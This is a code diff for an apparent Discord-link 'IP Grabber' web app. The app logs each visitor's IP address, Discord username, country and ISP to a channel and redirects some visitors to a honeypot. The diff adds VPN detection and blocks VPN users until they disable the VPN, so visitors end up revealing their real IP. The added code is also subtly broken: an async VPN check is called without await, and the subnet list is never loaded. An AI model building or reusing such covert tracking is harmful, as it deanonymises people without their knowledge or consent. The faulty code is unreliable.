@@ -9,6 +9,7 @@ Dependencies:
 
 """
 
+import ipaddress
 import requests
 from logger import Logger
 from json_handler import *
@@ -21,7 +22,53 @@ alternative_server_url:str
 test_flag:bool
 redirected:bool
 config:dict
+sub_nets: list
 
+def read_subnets_from_file(filename):
+    global sub_nets
+    """
+    Read subnets from a text file.
+
+    Parameters:
+    filename (str): Name of the text file containing subnets.
+
+    Returns:
+    list: List of subnets in CIDR notation.
+    """
+    subnets = []
+    try:
+        with open(filename, 'r') as file:
+            for line in file:
+                line = line.strip()
+                if line:  # Skip empty lines
+                    subnets.append(line)
+        return subnets
+    except FileNotFoundError:
+        print("File not found.")
+        return []
+
+def ip_in_subnet(ip, subnet):
+    """
+    Check if an IP address belongs to a subnet.
+
+    Parameters:
+    ip (str): IP address.
+    subnet (str): Subnet in CIDR notation.
+
+    Returns:
+    bool: True if IP address belongs to subnet, False otherwise.
+    """
+    try:
+        ip_obj = ipaddress.ip_address(ip)
+        subnet_obj = ipaddress.ip_network(subnet)
+        return ip_obj in subnet_obj
+    except ValueError as e:
+        print("Error:", e)
+        return False
+    
+async def check_for_vpn(ip):
+    global sub_nets
+    return any(ip_in_subnet(ip, subnet) for subnet in sub_nets)
 
 def send_to_channel(message:str):
     """
@@ -103,6 +150,8 @@ Country: {country_code}
 More infos: https://iplocation.com/?ip={ip}
 ''')
         return redirect(honeypot)
+    elif check_for_vpn(ip):
+        return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to join the Discord.'
     
     else:
         l.info(f"Rediredcting to: {normal_server}")
@@ -124,6 +173,7 @@ async def ip_grab(dc_handle):
     l.info(f'user is: {dc_handle}')
     ip_address = request.headers.get('X-Real-IP')
     l.info(f'IP Address is: {ip_address}')
+    vpn = check_for_vpn(ip_address)
     try:
         data = await request_ip_location(ip_address)
         ip = data['ip']
@@ -132,22 +182,23 @@ async def ip_grab(dc_handle):
         country_name = data['country_name']
         country_code2 = data['country_code2']
         isp = data['isp']
-        l.info(f'data is: {data}')
+        l.info(f'data is: {data}\nVPN: {vpn}')
         send_to_channel(f'''
 IP Grabber called:
 Username provided: {dc_handle}
 IP: {ip_address}
+VPN: {vpn}
 Country: {country_name}/{country_code2}
 More infos: https://iplocation.com/?ip={ip_address}
 ''')
+        if vpn:
+            return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket.'
+
         dc_handle += '?'
         return await render_template('result.html',dc_handle = dc_handle, ip=ip, ip_number=ip_number, ip_version=ip_version,
                                 country_name=country_name, country_code2=country_code2, isp=isp)
     except Exception as e:
             l.error(f'{e}')
-
-
-    
     return
    
 @app.route('/<path:dc_invite>')
